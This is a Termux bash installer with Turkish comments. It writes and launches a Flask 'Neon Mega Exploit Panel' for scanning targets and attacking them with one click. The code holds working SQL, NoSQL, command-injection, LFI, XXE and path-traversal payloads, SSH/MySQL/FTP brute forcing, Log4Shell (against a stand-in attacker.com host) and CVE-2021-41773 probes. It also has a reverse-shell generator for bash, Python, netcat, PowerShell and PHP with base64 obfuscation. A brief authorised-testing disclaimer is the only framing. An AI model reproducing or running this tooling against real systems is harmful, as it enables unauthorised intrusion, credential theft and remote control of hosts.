#!/data/data/com.termux/files/usr/bin/bash
set -e

# Renkler
RED='\033[0;31m'
GREEN='\033[0;32m'
CYAN='\033[0;36m'
YELLOW='\033[0;33m'
NC='\033[0m'

echo -e "${CYAN}[+] Neon Mega Exploit Panel - Tüm Özellikler${NC}"
echo -e "${CYAN}[+] Sadece eğitim ve yetkilendirilmiş testler için kullanın.${NC}"

# Android API seviyesi (Rust derlemesi için)
API_LEVEL=$(getprop ro.build.version.sdk 2>/dev/null || echo "28")
export ANDROID_API_LEVEL=$API_LEVEL

# 1. Sistem güncelleme ve temel paketler
echo -e "${GREEN}[1/5] Sistem güncelleniyor ve temel paketler yükleniyor...${NC}"
pkg update -y | while IFS= read -r line; do echo "  $line"; done
pkg install -y python python-pip netcat-openbsd rust git | while IFS= read -r line; do echo "  $line"; done

# 2. Python kütüphaneleri (pip yükseltme yok)
echo -e "${GREEN}[2/5] Python kütüphaneleri yükleniyor...${NC}"
pip install flask requests paramiko aiohttp dnspython flask-socketio eventlet pycryptodome reportlab python-telegram-bot shodan pymongo pymysql psycopg2-binary redis --progress-bar on | while IFS= read -r line; do echo "  $line"; done

# 3. Termux-API (bildirimler için)
echo -e "${GREEN}[3/5] Termux-API yükleniyor...${NC}"
pkg install -y termux-api 2>/dev/null || echo -e "${YELLOW}Termux-API kurulamadı, bildirimler çalışmayabilir.${NC}"

# 4. Rastgele port seç
PANEL_PORT=$(( RANDOM % 1000 + 5000 ))

# 5. Python panel kodunu geçici dosyaya yaz
echo -e "${GREEN}[4/5] Python panel kodu oluşturuluyor...${NC}"
cat > /data/data/com.termux/files/usr/tmp/neon_mega_panel.py << 'EOF'
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import random
import socket
import threading
import time
import json
import subprocess
import base64
import sqlite3
import asyncio
import aiohttp
import requests
import dns.resolver
from flask import Flask, render_template_string, request, jsonify, session, redirect, url_for
from flask_socketio import SocketIO, emit
from cryptography.fernet import Fernet
from reportlab.lib.pagesizes import letter
from reportlab.pdfgen import canvas
from reportlab.lib.utils import simpleSplit

# ---------- Veritabanı ----------
DB_PATH = "exploit_panel.db"

def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS scans
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  timestamp TEXT,
                  target_ip TEXT,
                  ports TEXT,
                  results TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS exploits
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  timestamp TEXT,
                  target_ip TEXT,
                  port INTEGER,
                  exploit_name TEXT,
                  result TEXT)''')
    conn.commit()
    conn.close()

init_db()

# ---------- Konfigürasyon ----------
LOG_FILE = "exploit_log.txt"
PROXY = None
TOR_ENABLED = False
AUTH_ENABLED = False
AUTH_PASSWORD = "changeme"

def log(message):
    with open(LOG_FILE, "a") as f:
        f.write(f"[{time.ctime()}] {message}\n")
    print(message)

def send_notification(title, message):
    try:
        subprocess.run(["termux-notification", "--title", title, "--content", message], timeout=2)
    except:
        pass

# ---------- Port tarama (asenkron) ----------
async def scan_port_async(ip, port, timeout=1):
    try:
        conn = asyncio.open_connection(ip, port)
        await asyncio.wait_for(conn, timeout)
        return port, True
    except:
        return port, False

async def scan_ports_async(ip, ports):
    tasks = [scan_port_async(ip, p) for p in ports]
    results = await asyncio.gather(*tasks)
    return [p for p, open in results if open]

def scan_ports(ip, ports):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    open_ports = loop.run_until_complete(scan_ports_async(ip, ports))
    loop.close()
    return open_ports

def grab_banner(ip, port, timeout=2):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((ip, port))
        if port == 21:
            s.send(b"HELP\r\n")
        elif port == 22:
            s.send(b"\n")
        elif port in [80, 443]:
            s.send(b"HEAD / HTTP/1.0\r\n\r\n")
        else:
            s.send(b"\n")
        banner = s.recv(1024).decode(errors='ignore')
        s.close()
        return banner.strip()
    except:
        return ""

def detect_os(ip):
    try:
        result = subprocess.run(["ping", "-c", "1", "-W", "1", ip], capture_output=True, text=True)
        for line in result.stdout.split("\n"):
            if "ttl=" in line.lower():
                ttl = int(line.lower().split("ttl=")[1].split()[0])
                if ttl <= 64:
                    return "Linux/Unix"
                elif ttl <= 128:
                    return "Windows"
                else:
                    return "Unknown"
    except:
        pass
    return "Unknown"

def subdomain_enum(domain):
    wordlist = ["www", "mail", "ftp", "admin", "test", "dev", "api", "blog", "shop", "support"]
    found = []
    for sub in wordlist:
        try:
            target = f"{sub}.{domain}"
            dns.resolver.resolve(target, 'A')
            found.append(target)
        except:
            pass
    return found

# ---------- Exploit fonksiyonları ----------
def sqli_exploit(ip, port):
    url = f"http://{ip}:{port}/login"
    payload = {"username": "' OR 1=1 --", "password": "x"}
    try:
        r = requests.post(url, data=payload, timeout=3, allow_redirects=False)
        if "welcome" in r.text.lower() or "dashboard" in r.text.lower():
            return {"success": True, "message": "SQL Injection başarılı!"}
        else:
            return {"success": False, "message": "SQL Injection başarısız."}
    except Exception as e:
        return {"success": False, "error": str(e)}

def cmd_injection(ip, port):
    url = f"http://{ip}:{port}/ping"
    payload = {"ip": "127.0.0.1; id"}
    try:
        r = requests.post(url, data=payload, timeout=3)
        if "uid=" in r.text:
            return {"success": True, "message": "Command Injection başarılı!"}
        else:
            return {"success": False, "message": "Command Injection başarısız."}
    except:
        return {"success": False, "error": "Bağlantı hatası"}

def path_traversal(ip, port):
    url = f"http://{ip}:{port}/../../../../etc/passwd"
    try:
        r = requests.get(url, timeout=3)
        if "root:" in r.text:
            return {"success": True, "message": "Path Traversal başarılı!"}
        else:
            return {"success": False, "message": "Path Traversal başarısız."}
    except:
        return {"success": False, "error": "Bağlantı hatası"}

def lfi_exploit(ip, port, file="/etc/passwd"):
    url = f"http://{ip}:{port}/index.php?page=../../../../{file}"
    try:
        r = requests.get(url, timeout=3)
        if "root:" in r.text:
            return {"success": True, "message": f"LFI başarılı: {file}"}
        else:
            return {"success": False, "message": "LFI başarısız."}
    except:
        return {"success": False, "error": "Bağlantı hatası"}

def rce_exploit(ip, port, cmd="id"):
    url = f"http://{ip}:{port}/exec"
    payload = {"cmd": cmd}
    try:
        r = requests.post(url, data=payload, timeout=3)
        if "uid=" in r.text:
            return {"success": True, "message": f"RCE başarılı: {r.text[:200]}"}
        else:
            return {"success": False, "message": "RCE başarısız."}
    except:
        return {"success": False, "error": "Bağlantı hatası"}

def xxe_exploit(ip, port):
    xml = """<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY test SYSTEM "file:///etc/passwd">
]>
<root>&test;</root>"""
    url = f"http://{ip}:{port}/xml"
    headers = {"Content-Type": "application/xml"}
    try:
        r = requests.post(url, data=xml, headers=headers, timeout=3)
        if "root:" in r.text:
            return {"success": True, "message": "XXE başarılı!"}
        else:
            return {"success": False, "message": "XXE başarısız."}
    except:
        return {"success": False, "error": "Bağlantı hatası"}

def nosql_injection(ip, port):
    url = f"http://{ip}:{port}/login"
    payload = {"username": {"$ne": None}, "password": {"$ne": None}}
    try:
        r = requests.post(url, json=payload, timeout=3)
        if "welcome" in r.text.lower():
            return {"success": True, "message": "NoSQL Injection başarılı!"}
        else:
            return {"success": False, "message": "NoSQL Injection başarısız."}
    except:
        return {"success": False, "error": "Bağlantı hatası"}

def redis_unauth(ip, port=6379):
    try:
        import redis
        r = redis.Redis(host=ip, port=port, socket_connect_timeout=2)
        info = r.info()
        return {"success": True, "message": f"Redis yetkisiz erişim: {info['redis_version']}"}
    except ImportError:
        return {"success": False, "message": "redis-py kurulu değil."}
    except:
        return {"success": False, "message": "Redis erişilemedi."}

def mongodb_unauth(ip, port=27017):
    try:
        from pymongo import MongoClient
        client = MongoClient(ip, port, serverSelectionTimeoutMS=2000)
        client.server_info()
        return {"success": True, "message": "MongoDB yetkisiz erişim!"}
    except ImportError:
        return {"success": False, "message": "pymongo kurulu değil."}
    except:
        return {"success": False, "message": "MongoDB erişilemedi."}

def mysql_brute(ip, port=3306, userlist=["root"], passlist=["", "root", "password"]):
    try:
        import pymysql
        for user in userlist:
            for pwd in passlist:
                try:
                    conn = pymysql.connect(host=ip, port=port, user=user, password=pwd, connect_timeout=3)
                    conn.close()
                    return {"success": True, "message": f"MySQL brute: {user}:{pwd}"}
                except:
                    continue
        return {"success": False, "message": "MySQL brute başarısız."}
    except ImportError:
        return {"success": False, "message": "pymysql kurulu değil."}

def ssh_brute(ip, port=22, userlist=["root", "admin"], passlist=["password", "123456"]):
    try:
        import paramiko
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        for user in userlist:
            for pwd in passlist:
                try:
                    client.connect(ip, port=port, username=user, password=pwd, timeout=3)
                    client.close()
                    return {"success": True, "message": f"SSH brute: {user}:{pwd}"}
                except:
                    continue
        return {"success": False, "message": "SSH brute başarısız."}
    except ImportError:
        return {"success": False, "message": "paramiko kurulu değil."}

def ftp_brute(ip, port=21, userlist=["root", "admin"], passlist=["password", "123456"]):
    import ftplib
    for user in userlist:
        for pwd in passlist:
            try:
                ftp = ftplib.FTP()
                ftp.connect(ip, port)
                ftp.login(user, pwd)
                ftp.quit()
                return {"success": True, "message": f"FTP brute: {user}:{pwd}"}
            except:
                continue
    return {"success": False, "message": "FTP brute başarısız."}

def cve_2021_44228(ip, port):
    url = f"http://{ip}:{port}/"
    headers = {"User-Agent": "${jndi:ldap://attacker.com/a}"}
    try:
        r = requests.get(url, headers=headers, timeout=3)
        # Gerçekte callback beklenir, simülasyon
        return {"success": True, "message": "Log4Shell payload gönderildi (simülasyon)."}
    except:
        return {"success": False, "error": "Bağlantı hatası"}

def cve_2021_41773(ip, port):
    url = f"http://{ip}:{port}/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
    try:
        r = requests.get(url, timeout=3)
        if "root:" in r.text:
            return {"success": True, "message": "CVE-2021-41773 başarılı!"}
        else:
            return {"success": False, "message": "CVE-2021-41773 başarısız."}
    except:
        return {"success": False, "error": "Bağlantı hatası"}

exploit_functions = {
    "sqli": sqli_exploit,
    "cmd_inj": cmd_injection,
    "path_trav": path_traversal,
    "lfi": lfi_exploit,
    "rce": rce_exploit,
    "xxe": xxe_exploit,
    "nosql": nosql_injection,
    "redis": redis_unauth,
    "mongodb": mongodb_unauth,
    "mysql": mysql_brute,
    "ssh": ssh_brute,
    "ftp": ftp_brute,
    "cve_2021_44228": cve_2021_44228,
    "cve_2021_41773": cve_2021_41773
}

# ---------- Reverse Shell ----------
listener_process = None

def start_listener(port):
    global listener_process
    if listener_process and listener_process.poll() is None:
        return {"success": False, "message": "Dinleyici zaten çalışıyor."}
    cmd = f"nc -lvnp {port}"
    listener_process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    return {"success": True, "message": f"Netcat dinleyici başlatıldı: {port}"}

def generate_payload(ip, port, type="bash", obfuscate=False):
    payloads = {
        "bash": f"bash -i >& /dev/tcp/{ip}/{port} 0>&1",
        "python": f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"]);'",
        "nc": f"nc -e /bin/sh {ip} {port}",
        "powershell": f"$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()",
        "php": f"php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
    }
    payload = payloads.get(type, "Invalid type")
    if obfuscate:
        payload = base64.b64encode(payload.encode()).decode()
        payload = f"echo {payload} | base64 -d | bash"
    return payload

# ---------- Shodan API ----------
def shodan_query(api_key, query):
    try:
        import shodan
        api = shodan.Shodan(api_key)
        results = api.search(query)
        return {"success": True, "results": results['matches'][:5]}
    except Exception as e:
        return {"success": False, "error": str(e)}

# ---------- Raporlama ----------
def generate_html_report():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT * FROM scans")
    scans = c.fetchall()
    c.execute("SELECT * FROM exploits")
    exploits = c.fetchall()
    conn.close()
    html = "<html><body><h1>Exploit Panel Raporu</h1>"
    html += "<h2>Tarama Kayıtları</h2><ul>"
    for row in scans:
        html += f"<li>{row[1]} - {row[2]}</li>"
    html += "</ul><h2>Exploit Kayıtları</h2><ul>"
    for row in exploits:
        html += f"<li>{row[1]} - {row[2]}:{row[3]} - {row[4]}</li>"
    html += "</ul></body></html>"
    with open("report.html", "w") as f:
        f.write(html)
    return "report.html"

def generate_pdf_report():
    c = canvas.Canvas("report.pdf", pagesize=letter)
    c.drawString(100, 750, "Exploit Panel Raporu")
    c.save()
    return "report.pdf"

# ---------- Flask Uygulaması ----------
app = Flask(__name__)
app.secret_key = os.urandom(24)

def require_auth(f):
    def wrapper(*args, **kwargs):
        if AUTH_ENABLED and not session.get('authenticated'):
            return redirect(url_for('login'))
        return f(*args, **kwargs)
    wrapper.__name__ = f.__name__
    return wrapper

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        if request.form['password'] == AUTH_PASSWORD:
            session['authenticated'] = True
            return redirect(url_for('index'))
        else:
            return "Wrong password", 401
    return '''
        <form method="post">
            <input type="password" name="password">
            <input type="submit">
        </form>
    '''

@app.route('/')
@require_auth
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/scan')
def scan():
    ip = request.args.get('ip', '127.0.0.1')
    ports = [21,22,80,443,8080,3306,5432,25,110,143,445,139]
    log(f"Tarama başlatıldı: {ip}")
    open_ports = scan_ports(ip, ports)
    port_info = []
    for p in open_ports:
        banner = grab_banner(ip, p)
        port_info.append({"port": p, "service": banner[:50]})
    os_guess = detect_os(ip)
    # Veritabanına kaydet
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("INSERT INTO scans (timestamp, target_ip, ports, results) VALUES (?, ?, ?, ?)",
              (time.ctime(), ip, json.dumps(open_ports), json.dumps(port_info)))
    conn.commit()
    conn.close()
    return jsonify({"ports": port_info, "os": os_guess})

@app.route('/subdomain')
def subdomain():
    domain = request.args.get('domain')
    if not domain:
        return jsonify({"error": "Domain gerekli"})
    results = subdomain_enum(domain)
    return jsonify({"subdomains": results})

@app.route('/exploit/<name>')
def run_exploit(name):
    ip = request.args.get('ip', '127.0.0.1')
    port = request.args.get('port')
    if not port:
        return jsonify({"error": "Port belirtilmeli"})
    port = int(port)
    log(f"Exploit çalıştırılıyor: {name} hedef {ip}:{port}")
    if name in exploit_functions:
        try:
            result = exploit_functions[name](ip, port)
            # Veritabanına kaydet
            conn = sqlite3.connect(DB_PATH)
            c = conn.cursor()
            c.execute("INSERT INTO exploits (timestamp, target_ip, port, exploit_name, result) VALUES (?, ?, ?, ?, ?)",
                      (time.ctime(), ip, port, name, json.dumps(result)))
            conn.commit()
            conn.close()
            send_notification("Exploit", f"{name} on {ip}:{port} - {result.get('message','')}")
            return jsonify(result)
        except Exception as e:
            log(f"Hata: {str(e)}")
            return jsonify({"error": str(e)})
    else:
        return jsonify({"error": "Bilinmeyen exploit"})

@app.route('/start_listener')
def start_listener_route():
    port = request.args.get('port')
    if not port:
        return jsonify({"error": "Port belirtilmeli"})
    port = int(port)
    log(f"Reverse shell dinleyici başlatılıyor: port {port}")
    return jsonify(start_listener(port))

@app.route('/generate_payload')
def generate_payload_route():
    ip = request.args.get('ip')
    port = request.args.get('port')
    typ = request.args.get('type', 'bash')
    obf = request.args.get('obfuscate', 'false').lower() == 'true'
    if not ip or not port:
        return jsonify({"error": "IP ve port belirtilmeli"})
    payload = generate_payload(ip, port, typ, obf)
    return jsonify({"payload": payload})

@app.route('/shodan')
def shodan_route():
    api_key = request.args.get('api_key')
    query = request.args.get('query')
    if not api_key or not query:
        return jsonify({"error": "API key ve query gerekli"})
    return jsonify(shodan_query(api_key, query))

@app.route('/report')
def report():
    format = request.args.get('format', 'html')
    if format == 'html':
        file = generate_html_report()
        return jsonify({"report": file})
    elif format == 'pdf':
        file = generate_pdf_report()
        return jsonify({"report": file})
    else:
        return jsonify({"error": "Geçersiz format"})

@app.route('/log')
def show_log():
    try:
        with open(LOG_FILE, "r") as f:
            content = f.read()
        return content
    except:
        return "Log dosyası henüz oluşturulmadı."

# ---------- HTML Şablonu (Neon Tema) ----------
HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>Neon Mega Exploit Panel</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0a0f0f;
            font-family: monospace;
            color: #0f0;
            padding: 20px;
        }
        .container { max-width: 1200px; margin: auto; }
        h1 { text-align: center; text-shadow: 0 0 5px #0f0; margin-bottom: 20px; }
        .neon-card {
            background: rgba(0,20,0,0.8);
            border: 1px solid #0f0;
            border-radius: 10px;
            padding: 20px;
            margin-bottom: 20px;
            box-shadow: 0 0 10px rgba(0,255,0,0.3);
        }
        .neon-card h2 { border-bottom: 1px solid #0f0; margin-bottom: 15px; }
        input, select, button {
            background: #111;
            color: #0f0;
            border: 1px solid #0f0;
            padding: 8px 12px;
            margin: 5px;
            font-family: monospace;
        }
        button:hover { background: #0f0; color: #000; cursor: pointer; }
        .port-list { list-style: none; padding: 0; }
        .port-item {
            background: #1a2a1a;
            margin: 10px 0;
            padding: 10px;
            border-radius: 5px;
            display: flex;
            align-items: center;
            gap: 10px;
            flex-wrap: wrap;
        }
        .result-box {
            background: #111;
            border: 1px solid #0f0;
            padding: 10px;
            white-space: pre-wrap;
            margin-top: 10px;
            max-height: 300px;
            overflow: auto;
        }
        .tab { display: inline-block; padding: 10px 20px; background: #0a0f0f; border: 1px solid #0f0; cursor: pointer; }
        .tab-content { display: none; padding: 15px; }
        .active-tab { background: #0f0; color: #000; }
        @media (max-width: 600px) {
            body { padding: 10px; }
            .port-item { flex-direction: column; align-items: stretch; }
            select, button { width: 100%; }
        }
    </style>
    <script>
        function showTab(tabId) {
            document.querySelectorAll('.tab-content').forEach(t => t.style.display = 'none');
            document.getElementById(tabId).style.display = 'block';
            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active-tab'));
            event.target.classList.add('active-tab');
        }
        function scanPorts() {
            let ip = document.getElementById('target_ip').value;
            fetch('/scan?ip=' + ip)
                .then(r => r.json())
                .then(data => {
                    let portList = document.getElementById('portList');
                    portList.innerHTML = '';
                    data.ports.forEach(p => {
                        let li = document.createElement('li');
                        li.className = 'port-item';
                        li.innerHTML = `Port ${p.port} (${p.service}) 
                            <select id="exploit_${p.port}">
                                <option value="sqli">SQL Injection</option>
                                <option value="cmd_inj">Command Injection</option>
                                <option value="path_trav">Path Traversal</option>
                                <option value="lfi">LFI</option>
                                <option value="rce">RCE</option>
                                <option value="xxe">XXE</option>
                                <option value="nosql">NoSQL Inj</option>
                                <option value="redis">Redis UnAuth</option>
                                <option value="mongodb">MongoDB UnAuth</option>
                                <option value="mysql">MySQL Brute</option>
                                <option value="ssh">SSH Brute</option>
                                <option value="ftp">FTP Brute</option>
                                <option value="cve_2021_44228">Log4Shell</option>
                                <option value="cve_2021_41773">CVE-2021-41773</option>
                            </select>
                            <button onclick="runExploit(${p.port})">Exploit Et</button>`;
                        portList.appendChild(li);
                    });
                    document.getElementById('os').innerText = 'OS: ' + data.os;
                });
        }
        function runExploit(port) {
            let exploit = document.getElementById(`exploit_${port}`).value;
            let ip = document.getElementById('target_ip').value;
            fetch(`/exploit/${exploit}?ip=${ip}&port=${port}`)
                .then(r => r.json())
                .then(data => {
                    document.getElementById('result').innerText = JSON.stringify(data, null, 2);
                });
        }
        function startListener() {
            let port = document.getElementById('listen_port').value;
            fetch(`/start_listener?port=${port}`)
                .then(r => r.json())
                .then(data => {
                    document.getElementById('listener_result').innerText = JSON.stringify(data);
                });
        }
        function generatePayload() {
            let ip = document.getElementById('payload_ip').value;
            let port = document.getElementById('payload_port').value;
            let type = document.getElementById('payload_type').value;
            let obf = document.getElementById('obfuscate').checked;
            fetch(`/generate_payload?ip=${ip}&port=${port}&type=${type}&obfuscate=${obf}`)
                .then(r => r.json())
                .then(data => {
                    document.getElementById('payload_result').innerText = data.payload;
                });
        }
        function shodanSearch() {
            let api = document.getElementById('shodan_api').value;
            let query = document.getElementById('shodan_query').value;
            fetch(`/shodan?api_key=${api}&query=${query}`)
                .then(r => r.json())
                .then(data => {
                    document.getElementById('shodan_result').innerText = JSON.stringify(data, null, 2);
                });
        }
        function subdomainEnum() {
            let domain = document.getElementById('domain').value;
            fetch(`/subdomain?domain=${domain}`)
                .then(r => r.json())
                .then(data => {
                    document.getElementById('subdomain_result').innerText = JSON.stringify(data, null, 2);
                });
        }
        function loadLog() {
            fetch('/log')
                .then(r => r.text())
                .then(t => document.getElementById('log_content').innerText = t);
        }
        setInterval(loadLog, 5000);
    </script>
</head>
<body>
<div class="container">
    <h1>⚡ NEON MEGA EXPLOIT PANEL ⚡</h1>
    <div class="neon-card">
        <div>
            <div class="tab" onclick="showTab('target')">🎯 Hedef</div>
            <div class="tab" onclick="showTab('scan')">🔍 Tarama</div>
            <div class="tab" onclick="showTab('exploit')">💀 Exploit'ler</div>
            <div class="tab" onclick="showTab('reverse')">🔄 Reverse Shell</div>
            <div class="tab" onclick="showTab('subdomain')">🌐 Alt Alan</div>
            <div class="tab" onclick="showTab('shodan')">🕵️ Shodan</div>
            <div class="tab" onclick="showTab('report')">📄 Rapor</div>
            <div class="tab" onclick="showTab('log')">📜 Log</div>
        </div>
    </div>

    <div id="target" class="tab-content" style="display:block;">
        <div class="neon-card">
            <h2>Hedef IP</h2>
            <input type="text" id="target_ip" value="127.0.0.1">
            <button onclick="scanPorts()">Portları Tara</button>
            <div id="os" class="result-box">OS: Bekleniyor...</div>
        </div>
    </div>

    <div id="scan" class="tab-content">
        <div class="neon-card">
            <h2>Tarama Sonuçları</h2>
            <ul id="portList" class="port-list"></ul>
        </div>
    </div>

    <div id="exploit" class="tab-content">
        <div class="neon-card">
            <h2>Exploit Sonuçları</h2>
            <div id="result" class="result-box">Sonuçlar burada...</div>
        </div>
    </div>

    <div id="reverse" class="tab-content">
        <div class="neon-card">
            <h2>Reverse Shell Dinleyici</h2>
            <input type="text" id="listen_port" placeholder="Port">
            <button onclick="startListener()">Başlat</button>
            <div id="listener_result" class="result-box"></div>
        </div>
        <div class="neon-card">
            <h2>Payload Oluştur</h2>
            <input type="text" id="payload_ip" placeholder="IP">
            <input type="text" id="payload_port" placeholder="Port">
            <select id="payload_type">
                <option value="bash">Bash</option>
                <option value="python">Python</option>
                <option value="nc">Netcat</option>
                <option value="powershell">PowerShell</option>
                <option value="php">PHP</option>
            </select>
            <label><input type="checkbox" id="obfuscate"> Base64 Obfuscate</label>
            <button onclick="generatePayload()">Oluştur</button>
            <div id="payload_result" class="result-box"></div>
        </div>
    </div>

    <div id="subdomain" class="tab-content">
        <div class="neon-card">
            <h2>Alt Alan Keşfi</h2>
            <input type="text" id="domain" placeholder="example.com">
            <button onclick="subdomainEnum()">Ara</button>
            <div id="subdomain_result" class="result-box"></div>
        </div>
    </div>

    <div id="shodan" class="tab-content">
        <div class="neon-card">
            <h2>Shodan Arama</h2>
            <input type="text" id="shodan_api" placeholder="API Key">
            <input type="text" id="shodan_query" placeholder="query">
            <button onclick="shodanSearch()">Ara</button>
            <div id="shodan_result" class="result-box"></div>
        </div>
    </div>

    <div id="report" class="tab-content">
        <div class="neon-card">
            <h2>Rapor Oluştur</h2>
            <button onclick="fetch('/report?format=html').then(r=>r.json()).then(d=>alert('Rapor: '+d.report))">HTML Rapor</button>
            <button onclick="fetch('/report?format=pdf').then(r=>r.json()).then(d=>alert('Rapor: '+d.report))">PDF Rapor</button>
        </div>
    </div>

    <div id="log" class="tab-content">
        <div class="neon-card">
            <h2>İşlem Günlüğü</h2>
            <pre id="log_content" class="result-box"></pre>
            <button onclick="loadLog()">Yenile</button>
        </div>
    </div>
</div>
<script>
    loadLog();
</script>
</body>
</html>
"""

if __name__ == '__main__':
    port = '''$PANEL_PORT'''
    print(f"\n[+] Panel başlatılıyor: http://localhost:{port}")
    app.run(host='0.0.0.0', port=int(port), debug=False)
EOF

# 6. Port değişkenini Python dosyasına yaz
sed -i "s/'''\$PANEL_PORT'''/$PANEL_PORT/" /data/data/com.termux/files/usr/tmp/neon_mega_panel.py

echo -e "${GREEN}[5/5] Panel başlatılıyor...${NC}"
echo -e "${CYAN}Adres: http://localhost:$PANEL_PORT${NC}"
echo -e "${RED}[!] Ctrl+C ile durdurabilirsiniz.${NC}"

python /data/data/com.termux/files/usr/tmp/neon_mega_panel.py